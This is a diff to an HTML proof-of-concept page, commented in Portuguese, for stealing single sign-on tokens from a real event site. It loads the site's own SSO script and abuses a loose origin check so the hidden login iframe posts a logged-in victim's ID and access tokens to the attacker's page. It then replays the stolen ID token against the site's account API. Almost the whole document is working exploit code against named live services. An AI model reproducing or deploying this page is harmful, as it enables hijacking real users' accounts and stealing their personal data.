@@ -2,50 +2,69 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<!-- garante que a origem vaze no document.referrer do iframe -->
 <meta name="referrer" content="unsafe-url">
 <title>TML SSO origin-check bypass PoC</title>
-<style>body{font:14px/1.5 monospace;padding:24px;background:#111;color:#0f0}pre{white-space:pre-wrap;word-break:break-all}h1{color:#fff}</style>
+<style>
+  body{font:14px/1.5 monospace;padding:24px;background:#111;color:#0f0}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:12px;border:1px solid #0f0}
+  h1{color:#fff}
+  .ok{color:#0f0}.bad{color:#f55}.warn{color:#fd0}
+  #st{font-size:18px}
+</style>
 </head>
 <body>
 <h1>Tomorrowland SSO — cross-origin token theft PoC</h1>
-<p>Origem desta página: <b id="org"></b> (precisa terminar em "tomorrowland.com" e ser HTTPS)</p>
-<p>Status: <b id="st">carregando SDK...</b></p>
-<pre id="out"></pre>
+<p>Origem desta página: <b id="org"></b></p>
+<p>Status: <b id="st" class="warn">carregando SDK...</b></p>
+<h3>Resultado:</h3>
+<pre id="out">(aguardando...)</pre>
+<h3>Log de mensagens postMessage recebidas (diagnóstico):</h3>
+<pre id="msglog">(nenhuma ainda)</pre>
 
-<!-- 1) Carrega a PRÓPRIA SDK do alvo -->
 <script src="https://login.tomorrowland.com/lib/tml-sso.iife.js"></script>
 <script>
-  document.getElementById('org').textContent = location.origin;
-  const st = document.getElementById('st');
-  const out = document.getElementById('out');
+  const $ = id => document.getElementById(id);
+  $('org').textContent = location.origin;
+  const st = $('st'), out = $('out'), msglog = $('msglog');
+  function log(el, txt){ el.textContent = (el.textContent === '(nenhuma ainda)' || el.textContent === '(aguardando...)' ? '' : el.textContent) + txt + '\n'; }
+
+  // DIAGNÓSTICO: loga TODA mensagem que chegar nesta janela
+  let msgCount = 0;
+  window.addEventListener('message', (e) => {
+    msgCount++;
+    let d = e.data; try { d = JSON.stringify(e.data); } catch(_){}
+    log(msglog, '#'+msgCount+' origin='+e.origin+' data='+String(d).slice(0,300));
+  });
 
   if (!window.TmlSso || !TmlSso.getUserData) {
-    st.textContent = 'SDK não carregou (TmlSso ausente)';
+    st.textContent = 'SDK não carregou (TmlSso ausente)'; st.className='bad';
   } else {
-    st.textContent = 'SDK ok — chamando getUserData() (vítima precisa estar logada em login.tomorrowland.com)...';
+    st.textContent = 'SDK ok — chamando getUserData()...'; st.className='warn';
 
-    // 2) Chama o fluxo headless. O iframe oculto /headless/getUserData
-    //    posta os tokens pra ESTA janela porque o endsWith() aceita nossa origem.
-    TmlSso.getUserData('https://login.tomorrowland.com')
+    const timeout = new Promise((_, rej) => setTimeout(() => rej('TIMEOUT 20s — o iframe não respondeu (provável partição de storage / cookie de terceiro)'), 20000));
+
+    Promise.race([ TmlSso.getUserData('https://login.tomorrowland.com'), timeout ])
       .then(async (data) => {
-        st.textContent = '🔓 TOKENS CAPTURADOS de outra origem!';
+        const hasTokens = data && data.tokens && (data.tokens.idToken || data.tokens.accessToken);
+        if (hasTokens) {
+          st.textContent = '🔓 TOKENS CAPTURADOS de outra origem!'; st.className='ok';
+        } else {
+          st.textContent = '⚠️ getUserData respondeu, mas SEM tokens (sessão não acessível no iframe)'; st.className='warn';
+        }
         out.textContent = JSON.stringify(data, null, 2);
         console.log('STOLEN', data);
 
-        // 3) (Opcional) prova de impacto: troca o idToken por um token de conta
-        //    via api.tomorrowland.com/account?token=true  (Authorization: idToken)
-        const idToken = data?.tokens?.idToken;
+        const idToken = data && data.tokens && data.tokens.idToken;
         if (idToken) {
           try {
-            const r = await fetch('https://api.tomorrowland.com/account?token=true', {
+            const r = await fetch('https://api.tomorrowland.com/account', {
               headers: { 'x-auth-type': 'tomorrowland', 'Authorization': idToken }
             });
-            out.textContent += '\n\n--- /account?token=true ---\n' + await r.text();
+            out.textContent += '\n\n--- GET api.tomorrowland.com/account (com idToken roubado) ---\n' + (await r.text());
           } catch (e) { out.textContent += '\n\n(account fetch falhou: ' + e + ')'; }
         }
       })
-      .catch((e) => { st.textContent = 'erro: ' + e; });
+      .catch((e) => { st.textContent = '❌ ' + e; st.className='bad'; out.textContent = String(e); console.log('POC-ERR', e); });
   }
 </script>
 </body>
